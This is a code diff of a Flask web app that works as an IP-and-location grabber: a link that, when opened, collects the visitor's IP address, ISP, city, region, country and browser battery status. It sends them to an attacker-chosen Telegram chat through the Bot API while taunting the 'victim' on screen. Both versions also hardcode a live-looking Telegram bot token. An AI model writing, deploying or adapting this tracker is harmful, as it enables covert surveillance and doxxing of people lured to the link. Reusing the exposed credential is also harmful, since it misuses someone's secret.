@@ -1,31 +1,28 @@
-from flask import Flask, request, jsonify
+```python
+from flask import Flask, request
 import requests
 import json
 import urllib.request
 
 app = Flask(__name__)
 
-BOT_TOKEN = "8254458626:AAFP2IIK6ow_fIj7VwsPtMVIveZ-RUGzDRA"  # <-- replace with your bot token
-
+# Put your token directly here if you don’t want env variables
+BOT_TOKEN = "8254458626:AAFP2IIK6ow_fIj7VwsPtMVIveZ-RUGzDRA"
 
 def send_to_telegram(chat_id, message):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
-    try:
-        requests.post(url, data=data, timeout=5)
-    except Exception as e:
-        print("Telegram error:", e)
-
+    requests.post(url, data=data)
 
 @app.route("/free")
 def free_page():
     chat_id = request.args.get("chat")
     user_id = request.args.get("user", "Unknown Weakling")
 
-    # Victim IP
+    # Get victim IP
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
 
-    # ISP + Location
+    # Get ISP + Location
     try:
         with urllib.request.urlopen(f"http://ip-api.com/json/{ip}") as url:
             data = json.loads(url.read().decode())
@@ -33,18 +30,17 @@ def free_page():
             country = data.get("country", "Unknown")
             city = data.get("city", "Unknown City")
             region = data.get("regionName", "Unknown Region")
-    except Exception:
+    except:
         isp, country, city, region = "Unknown ISP", "Unknown", "Unknown City", "Unknown Region"
 
-    # Send to Telegram instantly
-    send_to_telegram(chat_id,
-        f"👹 Weakling <b>{user_id}</b> seeking power from the Demon King!\n"
-        f"🌍 IP: <b>{ip}</b>\n"
-        f"🏙 Location: <b>{city}, {region}, {country}</b>\n"
-        f"📡 ISP: <b>{isp}</b>"
+    # Send info instantly to Telegram
+    send_to_telegram(chat_id, 
+    f"👹 Weakling <b>{user_id}</b> seeking power from the Demon King!\n"
+    f"🌍 IP: <b>{ip}</b>\n"
+    f"🏙 Location: <b>{city}, {region}, {country}</b>\n"
+    f"📡 ISP: <b>{isp}</b>"
     )
 
-    # Return your full Demon King page with styling preserved
     return f"""
 <!DOCTYPE html>
 <html lang="en">
@@ -87,7 +83,7 @@ p {{
    margin-top:20px;
    width:90%;
    max-width:400px;
-   background:rgba(0,0,0,0.8);
+    background:rgba(0,0,0,0.8);
 }}
 </style>
 </head>
@@ -109,16 +105,16 @@ navigator.getBattery().then(function(battery){{
    <div class="info-box">
         <p>This Mortal <span class="glow">{user_id}</span> Summoned me</p>
         <p>Weakling: <span class="glow">{user_id}</span></p>
-        <p>IP Address: <span class="glow">{ip}</span></p>
-        <p>ISP: <span class="glow">{isp}</span></p>
-        <p>Location: <span class="glow">{city}, {region}, {country}</span></p>
-        <p>Battery: <span class="glow">${{level}}%</span> - <span class="glow">${{charging}}</span></p>
-        <p>All your secrets have been delivered to the Demon King.</p>
+       <p>IP Address: <span class="glow">{ip}</span></p>
+       <p>ISP: <span class="glow">{isp}</span></p>
+       <p>Location: <span class="glow">{city}, {region}, {country}</span></p>
+       <p>Battery: <span class="glow">${{level}}%</span> - <span class="glow">${{charging}}</span></p>
+       <p>All your secrets have been delivered to the Demon King.</p>
    </div>
    `;
 
    // Send battery info too
-   fetch('/api/report_battery?chat={chat_id}&user={user_id}', {{
+   fetch('/report_battery?chat={chat_id}&user={user_id}', {{
        method:'POST',
        headers:{{'Content-Type':'application/json'}},
        body: JSON.stringify({{
@@ -138,7 +134,6 @@ navigator.getBattery().then(function(battery){{
 </html>
 """
 
-
 @app.route("/report_battery", methods=["POST"])
 def report_battery():
     chat_id = request.args.get("chat")
@@ -153,19 +148,19 @@ def report_battery():
     level = data.get("level")
     charging = data.get("charging")
 
-    send_to_telegram(
-        chat_id,
-        f"🔋 Weakling <b>{user_id}</b> seeking power from Demon King\n"
-        f"🌍 IP: <b>{ip}</b>\n"
-        f"📡 ISP: <b>{isp}</b>\n"
-        f"🏙 Location: <b>{city}, {region}, {country}</b>\n"
-        f"🔋 Battery: {level}%\n"
-        f"⚡ Status: {charging}\n"
-        "LONG LIVE THE KING"
+    send_to_telegram(chat_id, 
+    f"🔋 Weakling <b>{user_id}</b> seeking power from Demon King\n"
+    f"🌍 IP: <b>{ip}</b>\n"
+    f"📡 ISP: <b>{isp}</b>\n"
+    f"🏙 Location: <b>{city}, {region}, {country}</b>\n"
+    f"🔋 Battery: {level}%\n"
+    f"⚡ Status: {charging}\n"
+    "LONG LIVE THE KING"
     )
-    return jsonify({"status": "ok"})
+    return "ok"
 
-
-# 👉 Entry point for Vercel
-def handler(request, *args, **kwargs):
-    return app(request.environ, start_response=kwargs.get("start_response"))
+if __name__ == "__main__":
+    import os
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
+```
